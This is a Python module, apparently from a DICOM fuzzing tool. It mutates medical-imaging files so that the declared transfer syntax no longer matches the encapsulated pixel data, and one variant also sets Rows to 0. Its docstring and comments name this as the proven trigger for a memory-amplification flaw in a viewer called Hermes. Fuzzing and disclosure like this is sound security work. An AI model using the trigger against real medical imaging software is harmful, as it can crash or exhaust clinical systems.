"""TSUID Mismatch Fuzzer - Declared-vs-actual Transfer Syntax conflict.

Category: generic

Attacks the parser-state interaction between the declared Transfer
Syntax UID and the on-disk PixelData bytes. When a parser selects its
pixel-data decoder from the TSUID but the actual PixelData bytes were
written for a different transfer syntax, sizing math, termination
conditions, and codec-state transitions can all go wrong.

The minimum trigger for the Hermes CWE-770 memory-amplification
finding (>4 GB allocation from a 6 KB file) is exactly this pattern:
declared Explicit VR Little Endian + encapsulated JPEG 2000 PixelData
bytes + Rows = 0. Each tag mutation alone is harmless; the
interaction is what's lethal.

Attacks:
- Swap TSUID to Explicit VR Little Endian while preserving encapsulated
  PixelData bytes (the BD-style mismatch)
- Swap TSUID to Implicit VR Little Endian (alternate uncompressed target)
- Above + set Rows = 0 (the proven Hermes CWE-770 trigger)

Reference: artifacts/findings/cwe770_memory_amplification/disclosure/
"""

from __future__ import annotations

import random

from pydicom.dataset import Dataset

from dicom_fuzzer.utils.logger import get_logger

from .base import FormatFuzzerBase

logger = get_logger(__name__)

# Uncompressed transfer syntaxes -- safe to declare without actually
# re-encoding the bytes, which is precisely the point.
_TSUID_EXPLICIT_VR_LE = "1.2.840.10008.1.2.1"
_TSUID_IMPLICIT_VR_LE = "1.2.840.10008.1.2"

# Transfer syntaxes considered uncompressed for the purposes of
# "is the current TSUID worth swapping?". Files already in one of
# these have no encapsulated payload to leave behind, so the
# mismatch attack is a no-op on them.
_UNCOMPRESSED_TSUIDS = frozenset(
    {
        "1.2.840.10008.1.2",  # Implicit VR Little Endian
        "1.2.840.10008.1.2.1",  # Explicit VR Little Endian
        "1.2.840.10008.1.2.2",  # Explicit VR Big Endian
    }
)


class TSUIDMismatchFuzzer(FormatFuzzerBase):
    """Create a declared-vs-actual transfer syntax mismatch.

    Operates on files with an encapsulated transfer syntax (JPEG,
    JPEG 2000, JPEG-LS, RLE, etc.) by rewriting the TSUID to an
    uncompressed value while leaving the encapsulated PixelData bytes
    untouched. The result is a structurally valid DICOM file whose
    declared pixel-data layout disagrees with its actual contents.
    """

    @property
    def strategy_name(self) -> str:
        """Return the strategy name for identification."""
        return "tsuid_mismatch"

    def can_mutate(self, dataset: Dataset) -> bool:
        """Skip files that don't have an encapsulated TSUID to mismatch."""
        file_meta = getattr(dataset, "file_meta", None)
        if file_meta is None:
            return False
        ts = getattr(file_meta, "TransferSyntaxUID", None)
        if ts is None:
            return False
        return str(ts) not in _UNCOMPRESSED_TSUIDS

    def mutate(self, dataset: Dataset) -> Dataset:
        """Pick one variant at random and apply it to the dataset."""
        variants = [
            self._swap_to_explicit_vr_le,
            self._swap_to_implicit_vr_le,
            self._swap_with_rows_zero,
        ]
        chosen = random.choice(variants)
        self.last_variant = chosen.__name__
        try:
            return chosen(dataset)
        except Exception as e:
            logger.debug("tsuid_mismatch variant %s failed: %s", chosen.__name__, e)
            return dataset

    def _swap_to_explicit_vr_le(self, dataset: Dataset) -> Dataset:
        dataset.file_meta.TransferSyntaxUID = _TSUID_EXPLICIT_VR_LE
        return dataset

    def _swap_to_implicit_vr_le(self, dataset: Dataset) -> Dataset:
        dataset.file_meta.TransferSyntaxUID = _TSUID_IMPLICIT_VR_LE
        return dataset

    def _swap_with_rows_zero(self, dataset: Dataset) -> Dataset:
        # The proven Hermes CWE-770 trigger. TSUID flip selects the
        # uncompressed reader; Rows=0 poisons its sizing math.
        dataset.file_meta.TransferSyntaxUID = _TSUID_EXPLICIT_VR_LE
        if "Rows" in dataset:
            dataset.Rows = 0
        return dataset
